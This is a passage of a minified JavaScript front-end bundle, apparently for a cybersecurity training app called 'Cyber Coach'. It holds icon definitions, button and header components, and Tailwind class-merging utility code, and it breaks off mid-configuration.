Dr=re("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]);const A0=re("Send",[["path",{d:"m22 2-7 20-4-9-9-4Z",key:"1q3vgg"}],["path",{d:"M22 2 11 13",key:"nzbqef"}]]);const Sd=re("Settings",[["path",{d:"M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z",key:"1qme2f"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]);const hy=re("Share2",[["circle",{cx:"18",cy:"5",r:"3",key:"gq8acd"}],["circle",{cx:"6",cy:"12",r:"3",key:"w7nqdw"}],["circle",{cx:"18",cy:"19",r:"3",key:"1xt0gg"}],["line",{x1:"8.59",x2:"15.42",y1:"13.51",y2:"17.49",key:"47mynk"}],["line",{x1:"15.41",x2:"8.59",y1:"6.51",y2:"10.49",key:"1n3mei"}]]);const ze=re("Shield",[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]]);const fy=re("SkipBack",[["polygon",{points:"19 20 9 12 19 4 19 20",key:"o2sva"}],["line",{x1:"5",x2:"5",y1:"19",y2:"5",key:"1ocqjk"}]]);const my=re("SkipForward",[["polygon",{points:"5 4 15 12 5 20 5 4",key:"16p6eg"}],["line",{x1:"19",x2:"19",y1:"5",y2:"19",key:"futhcm"}]]);const py=re("SquarePen",[["path",{d:"M12 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7",key:"1m0v6g"}],["path",{d:"M18.375 2.625a2.121 2.121 0 1 1 3 3L12 15l-4 1 1-4Z",key:"1lpok0"}]]);const Va=re("Star",[["polygon",{points:"12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2",key:"8f66p6"}]]);const Ua=re("Target",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]]);const He=re("Terminal",[["polyline",{points:"4 17 10 11 4 5",key:"akl6gq"}],["line",{x1:"12",x2:"20",y1:"19",y2:"19",key:"q2wloq"}]]);const Ad=re("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]);const E0=re("TrendingUp",[["polyline",{points:"22 7 13.5 15.5 8.5 10.5 2 17",key:"126l90"}],["polyline",{points:"16 7 22 7 22 13",key:"kwv8wd"}]]);const Ed=re("Upload",[["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["polyline",{points:"17 8 12 3 7 8",key:"t8dd8p"}],["line",{x1:"12",x2:"12",y1:"3",y2:"15",key:"widbto"}]]);const zt=re("User",[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]]);const Ut=re("Users",[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["path",{d:"M16 3.13a4 4 0 0 1 0 7.75",key:"1da9ce"}]]);const Cd=re("Video",[["path",{d:"m22 8-6 4 6 4V8Z",key:"50v9me"}],["rect",{width:"14",height:"12",x:"2",y:"6",rx:"2",ry:"2",key:"1rqjg6"}]]);const C0=re("Volume2",[["polygon",{points:"11 5 6 9 2 9 2 15 6 15 11 19 11 5",key:"16drj5"}],["path",{d:"M15.54 8.46a5 5 0 0 1 0 7.07",key:"ltjumu"}],["path",{d:"M19.07 4.93a10 10 0 0 1 0 14.14",key:"1kegas"}]]);const xy=re("VolumeX",[["polygon",{points:"11 5 6 9 2 9 2 15 6 15 11 19 11 5",key:"16drj5"}],["line",{x1:"22",x2:"16",y1:"9",y2:"15",key:"1ewh16"}],["line",{x1:"16",x2:"22",y1:"9",y2:"15",key:"5ykzw1"}]]);const bs=re("XCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]);const Co=re("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]);const za=re("Zap",[["polygon",{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2",key:"45s27k"}]]),$t=({children:a,className:n="",variant:s="primary",size:i="md",isLoading:o=!1,leftIcon:c,rightIcon:d,disabled:m,...f})=>{const x="inline-flex items-center justify-center rounded-lg font-medium transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed active:scale-95",p={primary:"bg-primary text-primary-foreground hover:bg-primary/90 shadow-lg shadow-primary/20 hover:shadow-primary/40",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",outline:"border-2 border-input bg-background hover:bg-accent hover:text-accent-foreground",ghost:"hover:bg-accent hover:text-accent-foreground",danger:"bg-destructive text-destructive-foreground hover:bg-destructive/90 shadow-lg shadow-destructive/20",cyber:"bg-primary text-black hover:bg-primary/90 shadow-[0_0_20px_rgba(0,255,136,0.3)] hover:shadow-[0_0_30px_rgba(0,255,136,0.5)] border border-primary/50 font-semibold",success:"bg-green-600 text-white hover:bg-green-500 shadow-lg shadow-green-500/20",warning:"bg-yellow-500 text-white hover:bg-yellow-400 shadow-lg shadow-yellow-500/20"},b={sm:"h-9 px-3 text-xs",md:"h-10 px-4 py-2",lg:"h-12 px-8 text-lg",icon:"h-10 w-10"};return e.jsxs("button",{className:`${x} ${p[s]} ${b[i]} ${n}`,disabled:m||o,...f,children:[o&&e.jsx(ay,{className:"mr-2 h-4 w-4 animate-spin"}),!o&&c&&e.jsx("span",{className:"mr-2",children:c}),a,!o&&d&&e.jsx("span",{className:"ml-2",children:d})]})},Td=({className:a})=>{const{user:n,logout:s}=Ie();return e.jsx("header",{className:`sticky top-0 z-50 w-full border-b border-white/5 bg-background/80 backdrop-blur-xl ${a}`,children:e.jsxs("div",{className:"flex h-16 items-center px-6 gap-4",children:[e.jsxs("div",{className:"flex items-center gap-2 mr-4",children:[e.jsxs("div",{className:"relative",children:[e.jsx("div",{className:"absolute inset-0 bg-primary/50 blur-lg rounded-full animate-pulse"}),e.jsx(ze,{className:"relative h-8 w-8 text-primary"})]}),e.jsx("span",{className:"text-xl font-bold bg-gradient-to-r from-white to-white/60 bg-clip-text text-transparent hidden sm:inline-block",children:"Cyber Coach"})]}),e.jsx("div",{className:"flex-1 max-w-md hidden md:block",children:e.jsxs("div",{className:"relative group",children:[e.jsx("div",{className:"absolute inset-0 bg-primary/20 blur-md rounded-lg opacity-0 group-focus-within:opacity-100 transition-opacity duration-500"}),e.jsxs("div",{className:"relative flex items-center bg-white/5 rounded-lg border border-white/10 focus-within:border-primary/50 focus-within:bg-white/10 transition-all duration-300",children:[e.jsx(Dr,{className:"h-4 w-4 text-muted-foreground ml-3"}),e.jsx("input",{type:"text",placeholder:"Search courses, labs, or students...",className:"w-full bg-transparent border-none focus:ring-0 text-sm px-3 py-2 text-foreground placeholder:text-muted-foreground"})]})]})}),e.jsx("div",{className:"ml-auto flex items-center gap-3",children:n&&e.jsxs(e.Fragment,{children:[e.jsxs("button",{className:"relative p-2 rounded-lg hover:bg-white/5 text-muted-foreground hover:text-foreground transition-colors",children:[e.jsx(Wv,{className:"h-5 w-5"}),e.jsx("span",{className:"absolute top-1.5 right-1.5 h-2 w-2 bg-red-500 rounded-full border border-background"})]}),e.jsx("div",{className:"h-8 w-[1px] bg-white/10 mx-1"}),e.jsxs("div",{className:"flex items-center gap-3 pl-1",children:[e.jsxs("div",{className:"flex-col items-end hidden sm:flex",children:[e.jsx("span",{className:"text-sm font-medium text-foreground",children:n.name}),e.jsx("span",{className:"text-xs text-muted-foreground capitalize",children:n.role})]}),e.jsx("div",{className:"h-9 w-9 rounded-full bg-gradient-to-tr from-primary to-purple-500 p-[1px]",children:e.jsx("div",{className:"h-full w-full rounded-full bg-background flex items-center justify-center",children:e.jsx(zt,{className:"h-5 w-5 text-primary"})})}),e.jsx($t,{variant:"ghost",size:"icon",onClick:s,className:"text-muted-foreground hover:text-destructive hover:bg-destructive/10",children:e.jsx(Eo,{className:"h-5 w-5"})})]})]})})]})})};function T0(a){var n,s,i="";if(typeof a=="string"||typeof a=="number")i+=a;else if(typeof a=="object")if(Array.isArray(a)){var o=a.length;for(n=0;n<o;n++)a[n]&&(s=T0(a[n]))&&(i&&(i+=" "),i+=s)}else for(s in a)a[s]&&(i&&(i+=" "),i+=s);return i}function gy(){for(var a,n,s=0,i="",o=arguments.length;s<o;s++)(a=arguments[s])&&(n=T0(a))&&(i&&(i+=" "),i+=n);return i}const by=(a,n)=>{const s=new Array(a.length+n.length);for(let i=0;i<a.length;i++)s[i]=a[i];for(let i=0;i<n.length;i++)s[a.length+i]=n[i];return s},vy=(a,n)=>({classGroupId:a,validator:n}),P0=(a=new Map,n=null,s)=>({nextPart:a,validators:n,classGroupId:s}),ko="-",Em=[],yy="arbitrary..",wy=a=>{const n=Ny(a),{conflictingClassGroups:s,conflictingClassGroupModifiers:i}=a;return{getClassGroupId:d=>{if(d.startsWith("[")&&d.endsWith("]"))return jy(d);const m=d.split(ko),f=m[0]===""&&m.length>1?1:0;return R0(m,f,n)},getConflictingClassGroupIds:(d,m)=>{if(m){const f=i[d],x=s[d];return f?x?by(x,f):f:x||Em}return s[d]||Em}}},R0=(a,n,s)=>{if(a.length-n===0)return s.classGroupId;const o=a[n],c=s.nextPart.get(o);if(c){const x=R0(a,n+1,c);if(x)return x}const d=s.validators;if(d===null)return;const m=n===0?a.join(ko):a.slice(n).join(ko),f=d.length;for(let x=0;x<f;x++){const p=d[x];if(p.validator(m))return p.classGroupId}},jy=a=>a.slice(1,-1).indexOf(":")===-1?void 0:(()=>{const n=a.slice(1,-1),s=n.indexOf(":"),i=n.slice(0,s);return i?yy+i:void 0})(),Ny=a=>{const{theme:n,classGroups:s}=a;return ky(s,n)},ky=(a,n)=>{const s=P0();for(const i in a){const o=a[i];Pd(o,s,i,n)}return s},Pd=(a,n,s,i)=>{const o=a.length;for(let c=0;c<o;c++){const d=a[c];Fy(d,n,s,i)}},Fy=(a,n,s,i)=>{if(typeof a=="string"){_y(a,n,s);return}if(typeof a=="function"){Sy(a,n,s,i);return}Ay(a,n,s,i)},_y=(a,n,s)=>{const i=a===""?n:I0(n,a);i.classGroupId=s},Sy=(a,n,s,i)=>{if(Ey(a)){Pd(a(i),n,s,i);return}n.validators===null&&(n.validators=[]),n.validators.push(vy(s,a))},Ay=(a,n,s,i)=>{const o=Object.entries(a),c=o.length;for(let d=0;d<c;d++){const[m,f]=o[d];Pd(f,I0(n,m),s,i)}},I0=(a,n)=>{let s=a;const i=n.split(ko),o=i.length;for(let c=0;c<o;c++){const d=i[c];let m=s.nextPart.get(d);m||(m=P0(),s.nextPart.set(d,m)),s=m}return s},Ey=a=>"isThemeGetter"in a&&a.isThemeGetter===!0,Cy=a=>{if(a<1)return{get:()=>{},set:()=>{}};let n=0,s=Object.create(null),i=Object.create(null);const o=(c,d)=>{s[c]=d,n++,n>a&&(n=0,i=s,s=Object.create(null))};return{get(c){let d=s[c];if(d!==void 0)return d;if((d=i[c])!==void 0)return o(c,d),d},set(c,d){c in s?s[c]=d:o(c,d)}}},dd="!",Cm=":",Ty=[],Tm=(a,n,s,i,o)=>({modifiers:a,hasImportantModifier:n,baseClassName:s,maybePostfixModifierPosition:i,isExternal:o}),Py=a=>{const{prefix:n,experimentalParseClassName:s}=a;let i=o=>{const c=[];let d=0,m=0,f=0,x;const p=o.length;for(let k=0;k<p;k++){const F=o[k];if(d===0&&m===0){if(F===Cm){c.push(o.slice(f,k)),f=k+1;continue}if(F==="/"){x=k;continue}}F==="["?d++:F==="]"?d--:F==="("?m++:F===")"&&m--}const b=c.length===0?o:o.slice(f);let w=b,j=!1;b.endsWith(dd)?(w=b.slice(0,-1),j=!0):b.startsWith(dd)&&(w=b.slice(1),j=!0);const N=x&&x>f?x-f:void 0;return Tm(c,j,w,N)};if(n){const o=n+Cm,c=i;i=d=>d.startsWith(o)?c(d.slice(o.length)):Tm(Ty,!1,d,void 0,!0)}if(s){const o=i;i=c=>s({className:c,parseClassName:o})}return i},Ry=a=>{const n=new Map;return a.orderSensitiveModifiers.forEach((s,i)=>{n.set(s,1e6+i)}),s=>{const i=[];let o=[];for(let c=0;c<s.length;c++){const d=s[c],m=d[0]==="[",f=n.has(d);m||f?(o.length>0&&(o.sort(),i.push(...o),o=[]),i.push(d)):o.push(d)}return o.length>0&&(o.sort(),i.push(...o)),i}},Iy=a=>({cache:Cy(a.cacheSize),parseClassName:Py(a),sortModifiers:Ry(a),...wy(a)}),Ly=/\s+/,Oy=(a,n)=>{const{parseClassName:s,getClassGroupId:i,getConflictingClassGroupIds:o,sortModifiers:c}=n,d=[],m=a.trim().split(Ly);let f="";for(let x=m.length-1;x>=0;x-=1){const p=m[x],{isExternal:b,modifiers:w,hasImportantModifier:j,baseClassName:N,maybePostfixModifierPosition:k}=s(p);if(b){f=p+(f.length>0?" "+f:f);continue}let F=!!k,T=i(F?N.substring(0,k):N);if(!T){if(!F){f=p+(f.length>0?" "+f:f);continue}if(T=i(N),!T){f=p+(f.length>0?" "+f:f);continue}F=!1}const R=w.length===0?"":w.length===1?w[0]:c(w).join(":"),S=j?R+dd:R,U=S+T;if(d.indexOf(U)>-1)continue;d.push(U);const z=o(T,F);for(let H=0;H<z.length;++H){const G=z[H];d.push(S+G)}f=p+(f.length>0?" "+f:f)}return f},Dy=(...a)=>{let n=0,s,i,o="";for(;n<a.length;)(s=a[n++])&&(i=L0(s))&&(o&&(o+=" "),o+=i);return o},L0=a=>{if(typeof a=="string")return a;let n,s="";for(let i=0;i<a.length;i++)a[i]&&(n=L0(a[i]))&&(s&&(s+=" "),s+=n);return s},My=(a,...n)=>{let s,i,o,c;const d=f=>{const x=n.reduce((p,b)=>b(p),a());return s=Iy(x),i=s.cache.get,o=s.cache.set,c=m,m(f)},m=f=>{const x=i(f);if(x)return x;const p=Oy(f,s);return o(f,p),p};return c=d,(...f)=>c(Dy(...f))},$y=[],et=a=>{const n=s=>s[a]||$y;return n.isThemeGetter=!0,n},O0=/^\[(?:(\w[\w-]*):)?(.+)\]$/i,D0=/^\((?:(\w[\w-]*):)?(.+)\)$/i,By=/^\d+\/\d+$/,Uy=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,zy=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,qy=/^(rgba?|hsla?|hwb|(ok)?(lab|lch)|color-mix)\(.+\)$/,Wy=/^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,Vy=/^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,_n=a=>By.test(a),_e=a=>!!a&&!Number.isNaN(Number(a)),os=a=>!!a&&Number.isInteger(Number(a)),Lc=a=>a.endsWith("%")&&_e(a.slice(0,-1)),Ar=a=>Uy.test(a),Hy=()=>!0,Gy=a=>zy.test(a)&&!qy.test(a),M0=()=>!1,Qy=a=>Wy.test(a),Ky=a=>Vy.test(a),Yy=a=>!ue(a)&&!he(a),Jy=a=>Dn(a,U0,M0),ue=a=>O0.test(a),Ms=a=>Dn(a,z0,Gy),Oc=a=>Dn(a,rw,_e),Pm=a=>Dn(a,$0,M0),Xy=a=>Dn(a,B0,Ky),co=a=>Dn(a,q0,Qy),he=a=>D0.test(a),Ca=a=>Mn(a,z0),Zy=a=>Mn(a,sw),Rm=a=>Mn(a,$0),ew=a=>Mn(a,U0),tw=a=>Mn(a,B0),uo=a=>Mn(a,q0,!0),Dn=(a,n,s)=>{const i=O0.exec(a);return i?i[1]?n(i[1]):s(i[2]):!1},Mn=(a,n,s=!1)=>{const i=D0.exec(a);return i?i[1]?n(i[1]):s:!1},$0=a=>a==="position"||a==="percentage",B0=a=>a==="image"||a==="url",U0=a=>a==="length"||a==="size"||a==="bg-size",z0=a=>a==="length",rw=a=>a==="number",sw=a=>a==="family-name",q0=a=>a==="shadow",nw=()=>{const a=et("color"),n=et("font"),s=et("text"),i=et("font-weight"),o=et("tracking"),c=et("leading"),d=et("breakpoint"),m=et("container"),f=et("spacing"),x=et("radius"),p=et("shadow"),b=et("inset-shadow"),w=et("text-shadow"),j=et("drop-shadow"),N=et("blur"),k=et("perspective"),F=et("aspect"),T=et("ease"),R=et("animate"),S=()=>["auto","avoid","all","avoid-page","page","left","right","column"],U=()=>["center","top","bottom","left","right","top-left","left-top","top-right","right-top","bottom-right","right-bottom","bottom-left","left-bottom"],z=()=>[...U(),he,ue],H=()=>["auto","hidden","clip","visible","scroll"],G=()=>["auto","contain","none"],O=()=>[he,ue,f],V=()=>[_n,"full","auto",...O()],B=()=>[os,"none","subgrid",he,ue],ae=()=>["auto",{span:["full",os,he,ue]},os,he,ue],xe=()=>[os,"auto",he,ue],ye=()=>["auto","min","max","fr",he,ue],ne=()=>["start","end","center","between","around","evenly","stretch","baseline","center-safe","end-safe"],fe=()=>["start","end","center","stretch","center-safe","end-safe"],ie=()=>["auto",...O()],ee=()=>[_n,"auto","full","dvw","dvh","lvw","lvh","svw","svh","min","max","fit",...O()],M=()=>[a,he,ue],W=()=>[...U(),Rm,Pm,{position:[he,ue]}],Q=()=>["no-repeat",{repeat:["","x","y","space","round"]}],E=()=>["auto","cover","contain",ew,Jy,{size:[he,ue]}],I=()=>[Lc,Ca,Ms],P=()=>["","none","full",x,he,ue],K=()=>["",_e,Ca,Ms],le=()=>["solid","dashed","dotted","double"],q=()=>["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity"],se=()=>[_e,Lc,Rm,Pm],ve=()=>["","none",N,he,ue],Ne=()=>["none",_e,he,ue],Le=()=>["none",_e,he,ue],kt=()=>[_e,he,ue],rt=()=>[_n,"full",...O()];return{cacheSize:500,theme:{animate:["spin","ping","pulse","bounce"],aspect:["video"],blur:[Ar],breakpoint:[Ar],color:[Hy],container:[Ar],"drop-shadow":[Ar],ease:["in","out","in-out"],font:[Yy],"font-weight":["thin","extralight","light","normal","medium","semibold","bold","extrabold","black"],"inset-shadow":[Ar],leading:["none","tight","snug","normal","relaxed","loose"],perspective:["dramatic","near","normal","midrange","distant","none"],radius:[Ar],shadow:[Ar],spacing:["px",_e],text:[Ar],"text-shadow":[Ar],tracking:["tighter","tight","normal","wide","wider","widest"]},classGroups:{aspect:[{aspect:["auto","square",_n,ue,he,F]}],container:["container"],columns:[{columns:[_e,ue,he,m]}],"break-after":[{"break-after":S()}],"break-before":[{"break-before":S()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],sr:["sr-only","not-sr-only"],float:[{float:["right","left","none","start","end"]}],clear:[{clear:["left","right","both","none","start","end"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:z()}],overflow:[{overflow:H()}],"overflow-x":[{"overflow-x":H()}],"overflow-y":[{"overflow-y":H()}],overscroll:[{overscroll:G()}],"overscroll-x":[{"overscroll-x":G()}],"overscroll-y":[{"overscroll-y":G()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:V()}],"inset-x":[{"inset-x":V()}],"inset-y":[{"inset-y":V()}],start:[{start:V()}],end:[{end:V()}],top:[{top:V()}],right:[{right:V()}],bottom:[{bottom:V()}],left:[{left:V()}],visibility:["visible","invisible","collapse"],z:[{z:[os,"auto",he,ue]}],basis:[{basis:[_n,"full","auto",m,...O()]}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["nowrap","wrap","wrap-reverse"]}],flex:[{flex:[_e,_n,"auto","initial","none",ue]}],grow:[{grow:["",_e,he,ue]}],shrink:[{shrink:["",_e,he,ue]}],order:[{order:[os,"first","last","none",he,ue]}],"grid-cols":[{"grid-cols":B()}],"col-start-end":[{col:ae()}],"col-start":[{"col-start":xe()}],"col-end":[{"col-end":xe()}],"grid-rows":[{"grid-rows":B()}],"row-start-end":[{row:ae()}],"row-start":[{"row-start":xe()}],"row-end":[{"row-end":xe()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":ye()}],"auto-rows":[{"auto-rows":ye()}],gap:[{gap:O()}],"gap-x":[{"gap-x":O()}],"gap-y":[{"gap-y":O()}],"justify-content":[{justify:[...ne(),"normal"]}],"justify-items":[{"justify-items":[...fe(),"normal"]}],"justify-self":[{"justify-self":["auto",...fe()]}],"align-content":[{content:["normal",...ne()]}],"align-items":[{items:[...fe(),{baseline:["","last"]}]}],"align-self":[{self:["auto",...fe(),{baseline:["","last"]}]}],"place-content":[{"place-content":ne()}],"place-items":[{"place-items":[...fe(),"baseline"]}],"place-self":[{"place-self":["auto",...fe()]}],p:[{p:O()}],px:[{px:O()}],py:[{py:O()}],ps:[{ps:O()}],pe:[{pe:O()}],pt:[{pt:O()}],pr:[{pr:O()}],pb:[{pb:O()}],pl:[{pl:O()}],m:[{m:ie()}],mx:[{mx:ie()}],my:[{my:ie()}],ms:[{ms:ie()}],me:[{me:ie()}],mt:[{mt:ie()}],mr:[{mr:ie()}],mb:[{mb:ie()}],ml:[{ml:ie()}],"space-x":[{"space-x":O()}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":O()}],"space-y-reverse":["space-y-reverse"],size:[{size:ee()}],w:[{w:[m,"screen",...ee()]}],"min-w":[{"min-w":[m,"screen","none",...ee()]}],"max-w":[{"max-w":[m,"screen","none","prose",{screen:[d]},...ee()]}],h:[{h:["screen","lh",...ee()]}],"min-h":[{"min-h":["screen","lh","none",...ee()]}],"max-h":[{"max-h":["screen","lh",...ee()]}],"font-size":[{text:["base",s,Ca,Ms]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:[i,he,Oc]}],"font-stretch":[{"font-stretch":["ultra-condensed","extra-condensed","condensed","semi-condensed","normal","semi-expanded","expanded","extra-expanded","ultra-expanded",Lc,ue]}],"font-family":[{font:[Zy,ue,n]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractions"],tracking:[{tracking:[o,he,ue]}],"line-clamp":[{"line-clamp":[_e,"none",he,Oc]}],leading:[{leading:[c,...O()]}],"list-image":[{"list-image":["none",he,ue]}],"list-style-position":[{list:["inside","outside"]}],"list-style-type":[{list:["disc","decimal","none",he,ue]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"placeholder-color":[{placeholder:M()}],"text-color":[{text:M()}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[...le(),"wavy"]}],"text-decoration-thickness":[{decoration:[_e,"from-font","auto",he,Ms]}],"text-decoration-color":[{decoration:M()}],"underline-offset":[{"underline-offset":[_e,"auto",he,ue]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],"text-wrap":[{text:["wrap","nowrap","balance","pretty"]}],indent:[{indent:O()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",he,ue]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],wrap:[{wrap:["break-word","anywhere","normal"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",he,ue]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:W()}],"bg-repeat":[{bg:Q()}],"bg-size":[{bg:E()}],"bg-image":[{bg:["none",{linear:[{to:["t","tr","r","br","b","bl","l","tl"]},os,he,ue],radial:["",he,ue],conic:[os,he,ue]},tw,Xy]}],"bg-color":[{bg:M()}],"gradient-from-pos":[{from:I()}],"gradient-via-pos":[{via:I()}],"gradient-to-pos":[{to:I()}],"gradient-from":[{from:M()}],"gradient-via":[{via:M()}],"gradient-to":[{to:M()}],rounded:[{rounded:P()}],"rounded-s":[{"rounded-s":P()}],"rounded-e":[{"rounded-e":P()}],"rounded-t":[{"rounded-t":P()}],"rounded-r":[{"rounded-r":P()}],"rounded-b":[{"rounded-b":P()}],"rounded-l":[{"rounded-l":P()}],"rounded-ss":[{"rounded-ss":P()}],"rounded-se":[{"rounded-se":P()}],"rounded-ee":[{"rounded-ee":P()}],"rounded-es":[{"rounded-es":P()}],"rounded-tl":[{"rounded-tl":P()}],"rounded-tr":[{"rounded-tr":P()}],"rounded-br":[{"rounded-br":P()}],"rounded-bl":[{"rounded-bl":P()}],"border-w":[{border:K()}],"border-w-x":[{"border-x":K()}],"border-w-y":[{"border-y":K()}],"border-w-s":[{"border-s":K()}],"border-w-e":[{"border-e":K()}],"border-w-t":[{"border-t":K()}],"border-w-r":[{"border-r":K()}],"border-w-b":[{"border-b":K()}],"border-w-l":[{"border-l":K()}],"divide-x":[{"divide-x":K()}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":K()}],"divide-y-reverse":["divide-y-reverse"],"border-style":[{border:[...le(),"hidden","none"]}],"divide-style":[{divide:[...le(),"hidden","none"]}],"border-color":[{border:M()}],"border-color-x":[{"border-x":M()}],"border-color-y":[{"border-y":M()}],"border-color-s":[{"border-s":M()}],"border-color-e":[{"border-e":M()}],"border-color-t":[{"border-t":M()}],"border-color-r":[{"border-r":M()}],"border-color-b":[{"border-b":M()}],"border-color-l":[{"border-l":M()}],"divide-color":[{divide:M()}],"outline-style":[{outline:[...le(),"none","hidden"]}],"outline-offset":[{"outline-offset":[_e,he,ue]}],"outline-w":[{outline:["",_e,Ca,Ms]}],"outline-color":[{outline:M()}],shadow:[{shadow:["","none",p,uo,co]}],"shadow-color":[{shadow:M()}],"inset-shadow":[{"inset-shadow":["none",b,uo,co]}],"inset-shadow-color":[{"inset-shadow":M()}],"ring-w":[{ring:K()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:M()}],"ring-offset-w":[{"ring-offset":[_e,Ms]}],"ring-offset-color":[{"ring-offset":M()}],"inset-ring-w":[{"inset-ring":K()}],"inset-ring-color":[{"inset-ring":M()}],"text-shadow":[{"text-shadow":["none",w,uo,co]}],"text-shadow-color":[{"text-shadow":M()}],opacity:[{opacity:[_e,he,ue]}],"mix-blend":[{"mix-blend":[...q(),"plus-darker","plus-lighter"]}],"bg-blend":[{"bg-blend":q()}],"mask-clip":[{"mask-clip":["border","padding","content","fill","stroke","view"]},"mask-no-clip"],"mask-composite":[{mask:["add","subtract","intersect","exclude"]}],"mask-image-linear-pos":[{"mask-linear":[_e]}],"mask-image-linear-from-pos":[{"mask-linear-from":se()}],"mask-image-linear-to-pos":[{"mask-linear-to":se()}],"mask-image-linear-from-color":[{"mask-linear-from":M()}],"mask-image-linear-to-color":[{"mask-linear-to":M()}],"mask-image-t-from-pos":[{"mask-t-from":se()}],"mask-image-t-to-pos":[{"mask-t-to":se()}],"mask-image-t-from-color":[{"mask-t-from":M()}],"mask-image-t-to-color":[{"mask-t-to":M()}],"mask-image-r-from-pos":[{"mask-r-from":se()}],"mask-image-r-to-pos":[{"mask-r-to":se()}],"mask-image-r-from-color":[{"mas